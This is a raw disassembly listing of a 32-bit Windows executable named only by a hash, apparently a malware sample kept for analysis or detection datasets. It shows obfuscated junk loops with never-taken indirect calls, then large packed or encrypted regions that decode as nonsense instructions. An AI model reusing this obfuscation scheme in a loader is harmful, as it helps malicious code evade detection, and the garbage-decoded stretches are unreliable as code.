
cd3be6b30368205262a380008c6b89228819271ce4781e4d9f2e2fdd22e89b64.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd8d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd89,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e19c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fd71,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fd59,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fd59
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fd59,ecx
  401068:	cmp    DWORD PTR ds:0x42fd59,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fd59,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e5a7
  401090:	cmp    DWORD PTR ds:0x42fd59,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fd59
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fd59,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e1a4,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e78b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e77b,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e77b,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e77b,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e1a8
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e34f
  401100:	cmp    DWORD PTR ds:0x42e77b,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e77b
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e77b,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e77b
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e77b,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e19c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e19c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e19c,esi
  401145:	cmp    DWORD PTR ds:0x42e19c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e5ab
  401160:	cmp    DWORD PTR ds:0x42e19c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e19c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e19c,esi
  40117c:	cmp    DWORD PTR ds:0x42e19c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e1b4,0x1a
  401193:	cmp    DWORD PTR ds:0x42e1b4,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e1b4,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fdfa
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe02
  4011bf:	push   0x17d1
  4011c4:	push   0x42e2a7
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e4cb
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e1b4
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e1b4,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e77b,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd85
  4011f8:	adc    esi,DWORD PTR ds:0x42fd89
  4011fe:	mov    DWORD PTR ds:0x42fd85,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e783,0x17
  401216:	cmp    DWORD PTR ds:0x42e783,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e783,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e246
  401238:	push   0x42e1fd
  40123d:	call   DWORD PTR ds:0x42e5af
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e783
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e783,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fdfe,0x12
  40126b:	cmp    DWORD PTR ds:0x42fdfe,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fdfe,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e2a7
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e5b3
  4012a0:	mov    esi,DWORD PTR ds:0x42fdfe
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fdfe,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	js     0x4012b6
  4012f5:	sbb    ebx,DWORD PTR [ebp+0x70707070]
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	js     0x401310
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	adc    BYTE PTR ds:0xe0ad59b2,dl
  4013ad:	push   0x6b
  4013af:	xor    al,0x8e
  4013b1:	(bad)  
  4013b2:	mov    ecx,0xb2f079c4
  4013b7:	xchg   ecx,eax
  4013b8:	nop
  4013b9:	push   ss
  4013ba:	rcl    DWORD PTR ds:0x559a995b,1
  4013c0:	jecxz  0x4013c4
  4013c2:	push   ebx
  4013c3:	inc    esi
  4013c4:	arpl   WORD PTR [ebp-0x66],ax
  4013c7:	andps  xmm7,xmm0
  4013ca:	cmp    eax,0x1cd8cbcf
  4013cf:	mov    bh,0xab
  4013d1:	sbb    al,0x2
  4013d3:	push   edx
  4013d4:	ret    0xdccc
  4013d7:	out    dx,eax
  4013d8:	ss mov ch,0x47
  4013db:	sbb    BYTE PTR [ebp+0x26],bl
  4013de:	scas   al,BYTE PTR es:[edi]
  4013df:	sbb    eax,0xfbf2b24f
  4013e4:	or     al,0x21
  4013e6:	test   al,0x72
  4013e8:	ins    BYTE PTR es:[edi],dx
  4013e9:	fcom   DWORD PTR ds:0xe8c9c94
  4013f0:	sbb    al,0x98
  4013f2:	aam    0x39
  4013f4:	pop    ss
  4013f5:	ror    BYTE PTR [edx],cl
  4013f7:	sbb    ebp,DWORD PTR [ebp-0x26]
  4013fa:	push   0x8f93ec9f
  4013ff:	xor    eax,0x8d139739
  401404:	in     eax,dx
  401405:	fist   WORD PTR [edi]
  401407:	mov    ebp,0x75d2ecad
  40140c:	jno    0x40148c
  40140e:	jae    0x40147d
  401410:	ss adc eax,0xee9e7913
  401416:	sbb    al,0x12
  401418:	jge    0x401482
  40141a:	loop   0x401485
  40141c:	mov    edi,0x349124a0
  401421:	test   eax,0xb92492b5
  401426:	sub    DWORD PTR [edx+esi*4+0x860020c],edx
  40142d:	test   al,0xd6
  40142f:	loope  0x4013d8
  401431:	push   ecx
  401432:	mov    dh,bl
  401434:	jle    0x4013bf
  401436:	pop    ss
  401437:	shl    DWORD PTR [ebp-0x42],cl
  40143a:	adc    eax,0x2c547cab
  40143f:	imul   ebp,DWORD PTR [ecx+0x41],0xffffffb7
  401443:	sub    ch,ch
  401445:	pop    edx
  401446:	popa   
  401447:	jmp    0xf725:0x1573fe52
  40144e:	dec    esp
  40144f:	leave  
  401450:	repnz scas al,BYTE PTR es:[edi]
  401452:	xchg   esp,eax
  401453:	cmp    BYTE PTR [ecx-0x1b5c9f56],ch
  401459:	inc    edi
  40145a:	adc    BYTE PTR [edi],dl
  40145c:	jno    0x401459
  40145e:	push   ecx
  40145f:	pop    ss
  401460:	jo     0x401422
  401462:	popf   
  401463:	or     dh,0x74
  401466:	pop    ds
  401467:	shl    ah,cl
  401469:	sbb    BYTE PTR ds:0x9e79ae48,al
  40146f:	shl    BYTE PTR [edx+edx*4+0x4b],1
  401473:	scas   eax,DWORD PTR es:[edi]
  401474:	cmp    al,0xef
  401476:	outs   dx,DWORD PTR ds:[esi]
  401477:	jae    0x401410
  401479:	xchg   DWORD PTR [edi+edi*4-0xc441769],edx
  401480:	push   cs
  401481:	test   eax,0x28af675d
  401486:	fild   DWORD PTR [edi]
  401488:	xchg   ebp,eax
  401489:	dec    edx
  40148a:	xchg   edx,eax
  40148b:	jle    0x4014c0
  40148d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40148e:	ret    0xea29
  401491:	popf   
  401492:	(bad)  
  401493:	retf   
  401494:	jp     0x40147b
  401496:	bound  eax,QWORD PTR [ecx]
  401498:	iret   
  401499:	lock fwait
  40149b:	sbb    BYTE PTR [ebx],bh
  40149d:	jge    0x401425
  40149f:	or     bl,BYTE PTR [esi]
  4014a1:	enter  0x8694,0xa6
  4014a5:	push   es
  4014a6:	hlt    
  4014a7:	gs xor al,0x9a
  4014aa:	dec    esp
  4014ab:	mov    ds:0x68dfad9a,eax
  4014b0:	mov    ch,0x8a
  4014b2:	mov    ?,WORD PTR [esi+ecx*4]
  4014b5:	das    
  4014b6:	add    al,0x13
  4014b8:	je     0x4014b2
  4014ba:	sub    BYTE PTR [ebx-0x6d],bl
  4014bd:	fstp   DWORD PTR [esp+eiz*4]
  4014c0:	xchg   DWORD PTR [edi-0x77a14aae],edx
  4014c6:	les    esp,FWORD PTR [ebp+0x3319a899]
  4014cc:	pop    edx
  4014cd:	repnz aas 
  4014cf:	cdq    
  4014d0:	jo     0x40145a
  4014d2:	cmc    
  4014d3:	jge    0x4014c9
  4014d5:	data16 jp 0x4014b3
  4014d8:	fwait
  4014d9:	pop    ecx
  4014da:	or     edi,DWORD PTR [ebx]
  4014dc:	xchg   ecx,eax
  4014dd:	jp     0x401557
  4014df:	pop    ebp
  4014e0:	sahf   
  4014e1:	adc    BYTE PTR [esi+0x6f],cl
  4014e4:	scas   eax,DWORD PTR es:[edi]
  4014e5:	xchg   DWORD PTR [ebx+0x26],esi
  4014e8:	leave  
  4014e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014ea:	popa   
  4014eb:	pop    ecx
  4014ec:	cmp    DWORD PTR [edx-0x59],ebx
  4014ef:	jl     0x4014e5
  4014f1:	retf   0x5cbe
  4014f4:	std    
  4014f5:	mov    esi,0x294086e9
  4014fa:	call   0x9c7f719f
  4014ff:	mov    WORD PTR [ebp-0x4],ax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx+0x335b1fed]
  401516:	int    0x5e
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	and    al,0xaf
  401522:	pushf  
  401523:	jmp    0x9612:0xf94a4e8a
  40152a:	ins    DWORD PTR es:[di],dx
  40152c:	xchg   ecx,eax
  40152d:	mov    ecx,0x88419230
  401532:	mov    edi,0x24a0afb8
  401537:	js     0x40151f
  401539:	inc    edx
  40153a:	mov    ds:0x80633e91,al
  40153f:	adc    dl,dl
  401541:	mov    BYTE PTR [edi],bl
  401543:	stc    
  401544:	test   DWORD PTR [eax*2-0x2237692b],esp
  40154b:	jbe    0x40153e
  40154d:	mov    ch,0xa7
  40154f:	xchg   DWORD PTR [ecx+0x33],esi
  401552:	sub    ah,bl
  401554:	xor    eax,0x169207a1
  401559:	sbb    ebp,eax
  40155b:	mov    fs,WORD PTR [esi]
  40155d:	or     al,0xfb
  40155f:	push   edi
  401560:	sub    eax,0xfcb09fbe
  401565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401566:	pop    ecx
  401567:	fisubr WORD PTR [esi+0x1f]
  40156b:	dec    esi
  40156c:	outs   dx,DWORD PTR ds:[esi]
  40156d:	xchg   ecx,eax
  40156e:	fwait
  40156f:	xchg   DWORD PTR [edi+0x1d3db123],edx
  401575:	mov    bh,0x66
  401577:	pop    es
  401578:	scas   al,BYTE PTR es:[edi]
  401579:	shl    DWORD PTR [edi-0x14],0xbb
  40157d:	es imul ebx,edi,0x54496399
  401584:	adc    edx,DWORD PTR [esi]
  401586:	inc    esi
  401587:	test   al,0xa6
  401589:	or     BYTE PTR [ebp-0x60253b9f],dh
  40158f:	jo     0x401586
  401591:	icebp  
  401592:	jmp    0x401546
  401594:	mov    WORD PTR [eax+0x10857aa4],es
  40159a:	or     bl,BYTE PTR [edi]
  40159c:	idiv   BYTE PTR [ebx]
  40159e:	or     esi,DWORD PTR [edx-0x6e]
  4015a1:	fcom   st(5)
  4015a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a4:	leave  
  4015a5:	lahf   
  4015a6:	popf   
  4015a7:	fwait
  4015a8:	inc    esp
  4015a9:	dec    ebx
  4015aa:	or     al,0xf
  4015ac:	mov    dh,0xe5
  4015ae:	push   eax
  4015af:	pop    ecx
  4015b0:	mov    edx,0xaa27d957
  4015b5:	and    eax,0x42fd18ac
  4015ba:	iret   
  4015bb:	(bad)  
  4015bc:	lock push esi
  4015be:	or     DWORD PTR ds:0xc127895c,edi
  4015c4:	or     al,0x92
  4015c6:	sti    
  4015c7:	add    ebp,edi
  4015c9:	or     DWORD PTR [eax+0x53],0x38863ad9
  4015d0:	mov    bl,0xa3
  4015d2:	ds mov dl,0xfc
  4015d5:	push   ecx
  4015d6:	jg     0x401595
  4015d8:	cli    
  4015d9:	inc    edx
  4015da:	and    eax,0x453d2398
  4015df:	sbb    DWORD PTR [ebp-0x265039ab],edx
  4015e5:	aaa    
  4015e6:	mov    esp,0xaf901f92
  4015eb:	xchg   esp,eax
  4015ec:	mov    al,BYTE PTR [ebp+0x1b508b17]
  4015f2:	aad    0x50
  4015f4:	sub    BYTE PTR [ebp+0x35],ch
  4015f7:	inc    ebx
  4015f8:	repz xlat BYTE PTR ds:[ebx]
  4015fa:	dec    eax
  4015fb:	push   ds
  4015fc:	jp     0x4015ca
  4015fe:	adc    BYTE PTR [ebp-0x6b],dl
  401601:	and    ah,BYTE PTR [ecx-0x38]
  401604:	(bad)  
  401605:	stc    
  401606:	call   0x8ad931a9
  40160b:	mov    edx,0x58c8d180
  401610:	cmp    al,0xf
  401612:	ja     0x40163c
  401614:	popa   
  401615:	ret    
  401616:	int    0xfb
  401618:	pop    eax
  401619:	dec    edx
  40161a:	jnp    0x4015ff
  40161c:	imul   eax,DWORD PTR [ecx+0x61038f62],0x74
  401623:	rcl    ch,cl
  401625:	xor    DWORD PTR [ebx-0x5dc43403],0x225fb70c
  40162f:	and    DWORD PTR [ecx+0x71],ebx
  401632:	sbb    DWORD PTR [ebx+0x60238ddd],ebx
  401638:	dec    DWORD PTR [edi]
  40163a:	hlt    
  40163b:	sub    esi,DWORD PTR [edi+0x1d363377]
  401641:	jg     0x4015de
  401643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401644:	mov    eax,ds:0x4969a8fa
  401649:	mov    al,ds:0x787b7a67
  40164e:	clc    
  40164f:	imul   ecx,DWORD PTR [esi-0x35],0x695cbae9
  401656:	or     bh,cl
  401658:	push   es
  401659:	push   ds
  40165a:	mov    esi,0xe31917e3
  40165f:	and    al,0xa4
  401661:	cmc    
  401662:	test   al,0x5a
  401664:	pop    es
  401665:	mov    edx,DWORD PTR [ebp+0x76]
  401668:	imul   edx,DWORD PTR [eax],0xffffffd7
  40166b:	icebp  
  40166c:	or     cl,BYTE PTR [esi-0x73]
  40166f:	xchg   ebp,eax
  401670:	into   
  401671:	add    esp,DWORD PTR gs:[edi-0x6a]
  401675:	push   eax
  401676:	vmwrite ebp,DWORD PTR [eax]
  401679:	shl    DWORD PTR [edi+0x7b],0xf9
  40167d:	adc    BYTE PTR [ebx-0x4ef91a7f],bl
  401683:	mov    ds:0x30015dc5,eax
  401688:	push   0xffffffc0
  40168a:	(bad)  
  40168b:	cs pop ebp
  40168d:	imul   edi,eax,0x62
  401690:	jo     0x401639
  401692:	push   ss
  401693:	mov    fs,WORD PTR [ebx+0x6070eb99]
  401699:	cmc    
  40169a:	sub    dh,BYTE PTR [ebx+0x6b746970]
  4016a0:	or     dh,BYTE PTR [ebx-0x7362f2a0]
  4016a6:	sbb    ah,BYTE PTR [ebp-0x38cb0a6]
  4016ac:	adc    DWORD PTR [esi],edi
  4016ae:	mov    esp,0xb9fe2b4b
  4016b3:	sbb    DWORD PTR [eax-0x6c],ebp
  4016b6:	inc    ecx
  4016b7:	add    al,0x3e
  4016b9:	iret   
  4016ba:	dec    esi
  4016bb:	adc    al,0x2d
  4016bd:	adc    BYTE PTR [edi+0x29526e1b],0x79
  4016c4:	mov    ah,0xbb
  4016c6:	jae    0x4016d3
  4016c8:	mov    ebp,0x83c7c0ad
  4016cd:	mov    bl,0x8d
  4016cf:	in     eax,0x3a
  4016d1:	jb     0x4016b2
  4016d3:	pop    edi
  4016d4:	inc    ecx
  4016d5:	inc    ebp
  4016d6:	std    
  4016d7:	inc    ecx
  4016d8:	adc    eax,0xae790f87
  4016dd:	into   
  4016de:	sar    BYTE PTR [edx-0x75],cl
  4016e1:	repz in eax,0xbd
  4016e4:	(bad)
  4016e8:	call   0x57da:0xf2836803
  4016ef:	mov    ds:0x44b82c26,al
  4016f4:	test   eax,0x90dcc10e
  4016f9:	out    0xd7,al
  4016fb:	aas    
  4016fc:	fisttp QWORD PTR [ebx+0x24]
  4016ff:	cmp    al,0x77
  401701:	cld    
  401702:	mov    esp,0xf8ff447
  401707:	lahf   
  401708:	or     eax,0x189b1005
  40170d:	pusha  
  40170e:	push   0xffffffff
  401710:	sahf   
  401711:	fs mov ah,0x67
  401714:	inc    ecx
  401715:	outs   dx,DWORD PTR ds:[esi]
  401716:	xchg   esp,eax
  401717:	lock inc ebp
  401719:	mov    bl,BYTE PTR [edi-0x3862522]
  40171f:	or     eax,0x89d0458d
  401724:	inc    ebp
  401725:	int3   
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	retf   
  401741:	and    al,al
  401743:	adc    DWORD PTR [eax+0x7c],esi
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	adc    ecx,DWORD PTR [edx-0x12a2df77]
  401752:	dec    esi
  401753:	inc    ecx
  401754:	xchg   ebp,eax
  401755:	xchg   ebx,eax
  401756:	fistp  WORD PTR [esp+esi*4-0xe]
  40175a:	mov    edx,0xb6449110
  40175f:	sub    eax,0x66ef35bc
  401764:	bound  eax,QWORD PTR [ebx+0x4b]
  401767:	out    0xef,al
  401769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40176a:	pushf  
  40176b:	jne    0x401729
  40176d:	mov    edx,0x43c773f5
  401772:	mov    dh,0x29
  401774:	mov    eax,0xd56da45d
  401779:	sbb    edi,DWORD PTR [ecx+eax*1+0x6b]
  40177d:	fild   QWORD PTR [edx+0x76]
  401780:	scas   al,BYTE PTR es:[edi]
  401781:	xchg   BYTE PTR [ebp-0x73],dh
  401784:	lock repz add ah,cl
  401788:	(bad)  
  401789:	ds jl  0x4017da
  40178c:	fdivr  QWORD PTR [edi]
  40178e:	push   0xb609a2dd
  401793:	jg     0x40172d
  401795:	mov    ebx,0x586b0538
  40179a:	jl     0x401744
  40179c:	loope  0x4017ef
  40179e:	sub    eax,0xeb58937f
  4017a3:	xor    BYTE PTR [esp+esi*8],dh
  4017a6:	fptan  
  4017a8:	jle    0x4017bd
  4017aa:	je     0x401761
  4017ac:	lahf   
  4017ad:	push   ds
  4017ae:	fisttp WORD PTR [ebx+edi*4]
  4017b1:	xlat   BYTE PTR ds:[ebx]
  4017b2:	inc    ecx
  4017b3:	enter  0xb6,0x7
  4017b7:	inc    esp
  4017b8:	jne    0x401787
  4017ba:	pushf  
  4017bb:	mov    DWORD PTR ds:0x6d617a68,esi
  4017c1:	aaa    
  4017c2:	jae    0x40175e
  4017c4:	ins    BYTE PTR es:[edi],dx
  4017c5:	loope  0x401755
  4017c7:	sub    ecx,DWORD PTR [edi]
  4017c9:	add    eax,0xebccdf6e
  4017ce:	dec    esp
  4017cf:	ret    
  4017d0:	push   esp
  4017d1:	ds xchg edi,eax
  4017d3:	inc    esp
  4017d4:	mov    ecx,0xefd13742
  4017d9:	xor    eax,0xe31af2e6
  4017de:	fldcw  WORD PTR ds:0x28a31cf4
  4017e4:	cmp    eax,0x4efc561
  4017e9:	mov    DWORD PTR [edi-0x125decb4],eax
  4017ef:	push   esi
  4017f0:	into   
  4017f1:	sub    esp,esi
  4017f3:	xchg   esp,eax
  4017f4:	jl     0x40182b
  4017f6:	sub    DWORD PTR [ecx+ebx*8],0x9bb0f698
  4017fd:	loopne 0x40178d
  4017ff:	push   0xffffff85
  401801:	enter  0x12ac,0xb5
  401805:	mov    dh,0x4e
  401807:	mov    ecx,0xcf34bf57
  40180c:	jge    0x4017ff
  40180e:	xchg   esi,eax
  40180f:	mov    bh,BYTE PTR [esi]
  401811:	or     BYTE PTR [ebx-0x54],dl
  401814:	cdq    
  401815:	add    edx,0x52
  401818:	sahf   
  401819:	or     DWORD PTR [eax+0x71],eax
  40181c:	xchg   ebx,eax
  40181d:	mov    ds:0xad1c8c01,al
  401822:	push   ds
  401823:	fcomp  DWORD PTR [ecx-0x4791e1b3]
  401829:	and    bh,al
  40182b:	mov    ah,dl
  40182d:	xchg   BYTE PTR [ebx],ah
  40182f:	sub    DWORD PTR [eax+0x431a4ca6],0x24
  401836:	rcl    DWORD PTR [eax],0xed
  401839:	mov    ch,0x46
  40183b:	sub    al,0xa3
  40183d:	xor    eax,0x482ac7e3
  401842:	lods   eax,DWORD PTR ds:[esi]
  401843:	test   DWORD PTR [esi],esp
  401845:	lea    ebp,[ebp-0x7a5e7332]
  40184b:	imul   edx,DWORD PTR [edi+0x21],0x2bbcb833
  401852:	popf   
  401853:	xchg   edi,eax
  401854:	mov    al,0xa0
  401856:	nop
  401857:	sub    ebp,DWORD PTR [edi-0x635f448c]
  40185d:	lea    ebp,[edi-0x30]
  401860:	(bad)  
  401861:	mov    esi,0xf40171e4
  401866:	fldenv [eax+0xd]
  401869:	fist   WORD PTR [edx+0x642e3f5f]
  40186f:	inc    ebx
  401870:	mov    dh,0x7f
  401872:	(bad)  
  401873:	pop    esp
  401874:	int3   
  401875:	jecxz  0x4018e0
  401877:	fcmovbe st,st(3)
  401879:	nop
  40187a:	imul   eax,DWORD PTR [ebx],0x49
  40187d:	sub    DWORD PTR [ebx+ecx*2+0x4],0xf009a5c7
  401885:	int3   
  401886:	stc    
  401887:	fmul   QWORD PTR [esi+ecx*4+0x6d]
  40188b:	cmp    eax,0x50dff105
  401890:	or     al,0x72
  401892:	or     ecx,ecx
  401894:	(bad)  
  401895:	push   ss
  401896:	jae    0x4018fe
  401898:	dec    ecx
  401899:	push   edx
  40189a:	jno    0x4018c3
  40189c:	xchg   DWORD PTR [edx+0x66fc6d2b],ebp
  4018a2:	icebp  
  4018a3:	daa    
  4018a4:	imul   esp,DWORD PTR [edx+0xb],0xffffffef
  4018a8:	or     ebp,esi
  4018aa:	and    eax,0xf1d807cc
  4018af:	jo     0x401916
  4018b1:	out    0xf3,eax
  4018b3:	and    ebx,edx
  4018b5:	add    cl,dl
  4018b7:	bound  esp,QWORD PTR ds:0xd50db213
  4018bd:	sub    al,0x1e
  4018bf:	adc    dh,dl
  4018c1:	fld    DWORD PTR [ebx+0x9]
  4018c4:	pop    ss
  4018c5:	or     DWORD PTR [esi],0xa377c963
  4018cb:	and    al,0x93
  4018cd:	(bad)  
  4018d1:	ja     0x401874
  4018d3:	jecxz  0x4018c0
  4018d5:	iret   
  4018d6:	mov    esi,esp
  4018d8:	outs   dx,DWORD PTR ds:[esi]
  4018d9:	pushf  
  4018da:	sbb    cl,BYTE PTR [ecx+0x6e]
  4018dd:	imul   ebp,DWORD PTR [eax-0x26c11ddc],0x14a318b1
  4018e7:	mov    edx,0x35786d7a
  4018ec:	dec    ebp
  4018ed:	jns    0x4018f8
  4018ef:	ss add eax,0xa6c04393
  4018f5:	pusha  
  4018f6:	div    cl
  4018f8:	imul   eax,edx,0xe
  4018fb:	jbe    0x4018d5
  4018fd:	retf   0x5762
  401900:	fidiv  DWORD PTR es:[ebx]
  401903:	lods   al,BYTE PTR ds:[esi]
  401904:	loopne 0x401935
  401906:	jl     0x4018e1
  401908:	xchg   ecx,eax
  401909:	xlat   BYTE PTR ds:[ebx]
  40190a:	clc    
  40190b:	addr16 pop ebp
  40190d:	ja     0x4018ec
  40190f:	(bad)  
  401910:	mov    eax,0x4882d42f
  401915:	dec    ecx
  401916:	repnz dec esi
  401918:	xor    ah,ch
  40191a:	repnz pop edx
  40191c:	inc    ecx
  40191d:	and    BYTE PTR [edx-0x24],bh
  401920:	lea    eax,[eax+edi*4+0x8]
  401924:	addr16 jnp 0x40198e
  401927:	aad    0xe8
  401929:	imul   ebp,DWORD PTR [ebp-0x14],0x63950ec3
  401930:	js     0x401958
  401932:	cli    
  401933:	xchg   esi,eax
  401934:	arpl   WORD PTR [ebp-0x33501682],ax
